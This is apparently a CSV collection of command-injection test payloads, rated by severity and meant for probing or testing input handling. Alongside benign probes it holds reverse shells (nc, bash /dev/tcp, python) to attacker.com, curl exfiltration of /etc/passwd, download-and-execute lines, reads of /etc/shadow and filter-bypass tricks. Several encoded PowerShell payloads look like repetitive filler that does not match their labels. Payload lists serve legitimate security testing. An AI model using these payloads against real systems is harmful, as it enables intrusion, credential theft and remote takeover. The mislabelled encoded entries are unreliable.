id,attack_class,type,severity,context,payload_hash,payload
cmdinj-012,CmdInj,Command Injection,high,Execute whoami command,ef4957ec5768,whoami
cmdinj-013,CmdInj,Command Injection,high,Execute id command,ef5e57fa8bef,$(id)
cmdinj-014,CmdInj,Command Injection,medium,Simple echo injection,b75015d5f402,; echo injected
cmdinj-015,CmdInj,Command Injection,critical,Read shadow file,ec7d3c46bb42,&& cat /etc/shadow
cmdinj-016,CmdInj,Command Injection,high,Execute id command,714a1f2fc42f,; id
cmdinj-017,CmdInj,Command Injection,medium,Print environment variables,2de02fe0fef8,| env
cmdinj-018,CmdInj,Command Injection,high,List root directory,93fff531bb41,ls /
cmdinj-019,CmdInj,Command Injection,medium,List running processes,6925954660ca,$(ps aux)
cmdinj-020,CmdInj,Command Injection,high,Execute whoami command,694ba4ac233a,; whoami
cmdinj-021,CmdInj,Command Injection,high,URL encoded semicolon and id command,b0fb89a6d990,%3B%20id
cmdinj-022,CmdInj,Command Injection,high,Nested backticks execution,7f9b7878d0fd,`echo \whoami\`
cmdinj-023,CmdInj,Command Injection,medium,Print current user environment variable,e12a7d4e275e,; echo $USER
cmdinj-024,CmdInj,Command Injection,medium,Hex encoded space character,6af6f3b1ddc5,; echo\x20injected
cmdinj-025,CmdInj,Command Injection,critical,Base64 encoded reverse shell,c9144bb59892,; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash
cmdinj-026,CmdInj,Command Injection,medium,Timing attack with sleep,ff19c7eee198,$(sleep 10)
cmdinj-027,CmdInj,Command Injection,high,Nested command substitution,e3b6ed9c1cfb,; echo $(whoami)
cmdinj-028,CmdInj,Command Injection,medium,Escape semicolon,4b43832be9a4,; echo injected\; ls
cmdinj-029,CmdInj,Command Injection,high,Multiple command chaining,ebe48780b67d,; ls -la && whoami || echo failed
cmdinj-030,CmdInj,Command Injection,high,Grouped commands,93efc8d78f67,; (id; uname -a)
cmdinj-031,CmdInj,Command Injection,medium,Subshell with sleep,533f8e6949dc,; (sleep 5)
cmdinj-032,CmdInj,Command Injection,medium,Command injection with comment,8c3d17183825,; ls -la #
cmdinj-033,CmdInj,Command Injection,high,Nested command execution,3a8a258d4349,echo $(whoami)
cmdinj-034,CmdInj,Command Injection,medium,Print PATH environment variable,ef41be86de21,; echo $PATH
cmdinj-035,CmdInj,Command Injection,medium,Echo injected string,c8bab688e96b,$(echo injected)
cmdinj-036,CmdInj,Command Injection,high,Multiple commands in subshell,c65f102b19af,; (echo injected; whoami)
cmdinj-037,CmdInj,Command Injection,medium,Timing attack,7050692ef64e,; sleep 15
cmdinj-040,CmdInj,Command Injection,critical,Download and execute script,152c39e36ae4,; curl http://attacker.com/malware.sh -o /tmp/m.sh; sh /tmp/m.sh
cmdinj-042,CmdInj,Command Injection,medium,Set environment variable,928f9c3a614c,; export MALICIOUS=1
cmdinj-043,CmdInj,Command Injection,medium,Write to file,ae9fdde0a31f,; echo 'malicious' > /tmp/malicious.txt
cmdinj-044,CmdInj,Command Injection,medium,Change file permissions,09fc5bc3c14f,; chmod +x /tmp/m.sh
cmdinj-045,CmdInj,Command Injection,critical,Read shadow file,f9a8b04e531b,; cat /etc/shadow
cmdinj-046,CmdInj,Command Injection,medium,Echo with special characters,a71aec286e64,; echo 'injected; ls -la'
cmdinj-047,CmdInj,Command Injection,high,Nested command with quotes,a0d57fe40234,"; echo ""$(whoami)"""
cmdinj-048,CmdInj,Command Injection,high,Execute command via awk,306b11a2d24b,"; awk 'BEGIN {system(""id"")}'"
cmdinj-049,CmdInj,Command Injection,high,Execute command via perl,630db19f080a,; perl -e 'print id'
cmdinj-050,CmdInj,Command Injection,high,Execute command via python,fdbf38f7f927,"; python -c 'import os; os.system(""id"")'"
cmdinj-051,CmdInj,Command Injection,high,Execute whoami command,f49b7cb55907,& whoami
cmdinj-052,CmdInj,Command Injection,high,List directory contents,d70b2c413b59,| dir
cmdinj-053,CmdInj,Command Injection,high,Display network config,71dd74741e85,&& ipconfig
cmdinj-054,CmdInj,Command Injection,high,List users,75fddf25f914,|| net user
cmdinj-055,CmdInj,Command Injection,high,List running processes,cf8a4bce998c,; Get-Process
cmdinj-057,CmdInj,Command Injection,high,List directory contents,c11e80b7c7a3,$(Get-ChildItem)
cmdinj-058,CmdInj,Command Injection,medium,Launch notepad,0061bba3d9d7,; Start-Process notepad.exe
cmdinj-059,CmdInj,Command Injection,medium,Write to file,eb561b86db7a,& echo injected > C:\Windows\Temp\injected.txt
cmdinj-060,CmdInj,Command Injection,critical,Reverse shell,0b6e60d42906,& nc attacker.com 4444 -e cmd.exe
cmdinj-062,CmdInj,Command Injection,high,Execute id,f1125ace3b36,| id
cmdinj-063,CmdInj,Command Injection,high,System info,6af27c9bd533,&& uname -a
cmdinj-069,CmdInj,Command Injection,high,Encoded PowerShell command,9b9ca04120ea,; powershell -EncodedCommand SQBFAFgAUABMAGEAYwBlAC4AZQB4AGU=
cmdinj-070,CmdInj,Command Injection,medium,Loop command,8152eac4676d,"& for /L %i in (1,1,5) do @echo %i"
cmdinj-071,CmdInj,Command Injection,high,Execute command,51c92419e714,; Invoke-Expression 'whoami'
cmdinj-072,CmdInj,Command Injection,medium,Print environment variables,f00322c1842f,; env
cmdinj-073,CmdInj,Command Injection,critical,Read passwd file,eae687bfdc7b,; cat /etc/passwd
cmdinj-074,CmdInj,Command Injection,medium,Query registry,b1e053ed520f,& reg query HKLM\Software
cmdinj-075,CmdInj,Command Injection,high,Read hosts file,2aa54be1cdb7,; Get-Content C:\Windows\System32\drivers\etc\hosts
cmdinj-076,CmdInj,Command Injection,medium,Kernel messages,657ae5eab438,; dmesg
cmdinj-077,CmdInj,Command Injection,medium,Network connections,aec9bd9f59ed,; netstat -an
cmdinj-078,CmdInj,Command Injection,medium,List running tasks,13c9d34037ba,& tasklist
cmdinj-079,CmdInj,Command Injection,medium,List services,b2a8b4654612,; Get-Service
cmdinj-080,CmdInj,Command Injection,medium,List processes,a59f22319d69,; ps aux
cmdinj-081,CmdInj,Command Injection,medium,Echo and filter output,d3fefbccdf30,& echo injected | findstr injected
cmdinj-082,CmdInj,Command Injection,medium,Launch process hidden,3bc4a061c6a5,; Start-Process notepad.exe -WindowStyle Hidden
cmdinj-083,CmdInj,Command Injection,critical,Exfiltrate data via curl,c7f5ff9d079d,; curl http://attacker.com/?data=$(cat /etc/passwd)
cmdinj-084,CmdInj,Command Injection,high,Encoded PowerShell payload,8c95c6e9c474,& powershell -EncodedCommand JABXAGUAYgA9ACJIZWxsbyBXb3JsZCIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA
cmdinj-085,CmdInj,Command Injection,critical,Reverse shell via netcat,48b251e88420,; nc attacker.com 4444 -e /bin/bash
cmdinj-086,CmdInj,Command Injection,critical,Download and execute file,50a2485b3e86,& certutil -urlcache -split -f http://attacker.com/malware.exe malware.exe & malware.exe
cmdinj-087,CmdInj,Command Injection,critical,Reverse shell via bash,f110826db702,; bash -i >& /dev/tcp/attacker.com/4444 0>&1
cmdinj-088,CmdInj,Command Injection,critical,Download and execute PowerShell script,7cbc0454d2c2,; Invoke-WebRequest -Uri http://attacker.com/malware.ps1 -OutFile C:\Windows\Temp\m.ps1; powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\m.ps1
cmdinj-089,CmdInj,Command Injection,critical,Reverse shell via python,b78f75a23d45,"; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'"
cmdinj-090,CmdInj,Command Injection,critical,Encoded PowerShell reverse shell,26308b1bcfa3,& powershell -EncodedCommand SQBFAFgAUABMAGUAYQBjAGgAIABbAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQ==
cmdinj-091,CmdInj,Command Injection,high,Bypass simple filters using ${IFS} (space) variable,9bb881b77709,; e${IFS}cho injected
cmdinj-093,CmdInj,Command Injection,high,Double URL encoded semicolon and id,113cc530473c,%253B%2520id
cmdinj-094,CmdInj,Command Injection,high,Use variable to execute command,f649e1f35f6b,; VAR=whoami; $VAR
cmdinj-095,CmdInj,Command Injection,critical,Decode and execute base64 payload,04767991e893,; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
cmdinj-096,CmdInj,Command Injection,high,Use newline as command separator,dd10bf6ed0a4,"&& echo injected
id"
cmdinj-097,CmdInj,Command Injection,critical,Obfuscated PowerShell encoded command,cdaac6c94300,; powershell -EncodedCommand JABXAGUAYgA9ACJXaG8gSSBhbSIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA
cmdinj-098,CmdInj,Command Injection,high,Nested command substitution with quotes,a3880cf6fb97,"; echo $(echo ""$(whoami)"")"
cmdinj-099,CmdInj,Command Injection,high,Indirect command execution via env var,f90ecb687fae,; export CMD=whoami; ${CMD}
